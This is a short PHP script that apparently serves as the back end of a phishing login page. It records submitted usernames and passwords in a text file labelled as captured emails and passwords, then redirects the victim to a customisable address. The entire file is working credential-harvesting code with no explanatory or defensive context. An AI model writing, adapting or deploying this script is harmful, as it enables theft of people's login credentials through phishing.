<?php
include 'info.php';

file_put_contents("usernames.txt", "[^]Email -> " . $_POST['username'] . "\n[^]Password -> " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: <CUSTOM>');
exit();
?>